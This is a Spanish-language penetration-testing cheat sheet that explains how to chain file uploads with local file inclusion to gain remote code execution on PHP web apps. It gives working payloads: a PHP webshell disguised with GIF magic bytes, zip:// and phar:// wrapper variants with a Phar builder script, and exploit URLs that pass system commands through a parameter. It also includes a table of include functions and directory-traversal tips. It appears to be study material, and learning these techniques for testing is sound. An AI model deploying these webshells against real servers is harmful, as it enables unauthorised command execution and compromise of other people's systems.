---
tags:
  - LFI
  - fileupload
  - RCE
  - webapp
---
## Conceptos Clave (TL;DR)

* La capacidad de subir archivos en el servidor backend extiende la explotación de vulnerabilidades como la inclusión de archivos (LFI).

* Para este ataque, no se requiere que el formulario de subida de archivos sea vulnerable en si mismo, simplemente que permita la carga de archivos.

* Si la función vulnerable de LFI posee capacidades de ejecución de código, el código inyectado en el archivo subido se ejecutara sin importar su extensión o el tipo de archivo.

* Un atacante puede subir un archivo permitido, como una imagen, pero almacenar dentro una webshell en lugar de datos de imagen reales; al incluirlo mediante LFI, se obtiene ejecución remota de comandos.

  

## Herramientas Clave

* **Inspeccionador de Codigo Fuente / Fuzzer:** Utilizado para descubrir la ruta exacta donde la aplicacion almacena los archivos subidos (ej. inspeccionando el HTML o fuzzing de directorios).

* **Utilidades de linea de comandos (echo, zip, php):** Empleadas para generar payloads maliciosos, agregar magic bytes, crear archivos comprimidos y compilar archivos Phar.

  

## Metodología Paso a Paso

1. **Creación del Payload:** Generar un archivo que cumpla con las restricciones de subida de la aplicación (ej. extensiones permitidas y magic bytes) pero que contenga código PHP ejecutable.

2. **Subida del Archivo:** Utilizar la funcionalidad legitima de la aplicación web (ej. pagina de configuración de perfil) para subir el archivo crafteado al servidor.

3. **Identificacion de la Ruta:** Obtener la ruta del archivo subido inspeccionando el codigo fuente de la aplicacion o realizando fuzzing para descubrir el directorio de subidas.

4. **Ejecucion via LFI:** Utilizar el parametro vulnerable a LFI para incluir la ruta del archivo subido, lo que detonara la ejecucion del codigo inyectado. Se pueden utilizar metodos directos o wrappers de PHP (zip://, phar://) como alternativas.

  
## Cheat Sheet de Comandos

### Metodo 1: Imagen Maliciosa (Directo)
```bash
# Crea un archivo con extension permitida, inyecta magic bytes (GIF8) para evadir filtros de contenido y adjunta la webshell PHP.

echo 'GIF8<?php system($_GET["cmd"]); ?>' > <FILENAME>.gif
```

```python
# Llama al archivo subido a traves de la vulnerabilidad LFI para ejecutar comandos de sistema.

http://<TARGET_IP>:<PORT>/<VULN_PAGE>.php?<VULN_PARAM>=<UPLOAD_PATH>/<FILENAME>.gif&cmd=<COMMAND>
```

### Metodo 2: Wrapper Zip
```bash
# Crea un script PHP malicioso y lo empaqueta dentro de un archivo zip camuflado con extension de imagen.

echo '<?php system($_GET["cmd"]); ?>' > <SHELL_NAME>.php && zip <FILENAME>.jpg <SHELL_NAME>.php
```

```text
# Ejecuta el codigo contenido en el zip utilizando el wrapper zip://. El simbolo '#' se codifica como '%23'.

http://<TARGET_IP>:<PORT>/<VULN_PAGE>.php?<VULN_PARAM>=zip://<UPLOAD_PATH>/<FILENAME>.jpg%23<SHELL_NAME>.php&cmd=<COMMAND>
```

### Metédo 3: Wrapper Phar
```php
# Script PHP (builder.php) utilizado para compilar un archivo phar que escribe la webshell en un sub-archivo interno.

<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('<INTERNAL_TXT>.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
# Compila el script PHP anterior en un archivo Phar modificando las restricciones de solo lectura temporalmente, y lo renombra como imagen.

php --define phar.readonly=0 <BUILDER_SCRIPT>.php && mv shell.phar <FILENAME>.jpg
```

```python
# Ejecuta el codigo contenido en el phar utilizando el wrapper phar://. La barra '/' que separa el archivo principal del interno se codifica como '%2F'.

http://<TARGET_IP>:<PORT>/<VULN_PAGE>.php?<VULN_PARAM>=phar://<UPLOAD_PATH>/<FILENAME>.jpg%2F<INTERNAL_TXT>.txt&cmd=<COMMAND>
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

## "Gotchas" y Troubleshooting

* Se recomienda utilizar formato GIF porque sus magic bytes (GIF8) son caracteres ASCII faciles de tipear, a diferencia de otras extensiones cuyos magic bytes estan en binario y requeririan URL encoding.

* Si la vulnerabilidad LFI prefija un directorio antes de tu input, debes utilizar secuencias de directory traversal (`../`) para salir de ese directorio antes de especificar la ruta hacia tu archivo subido.

* El metodo de subida basico es el mas confiable; los wrappers zip y phar deben considerarse metodos alternativos en caso de que el primero falle.

* Es posible que el wrapper zip no este habilitado por defecto, lo que provocaria que este metodo no funcione en todos los entornos.

* Existe un ataque LFI antiguo basado en el archivo `phpinfo()`, pero requiere que las subidas esten habilitadas, una version antigua de PHP y que el `phpinfo()` este expuesto.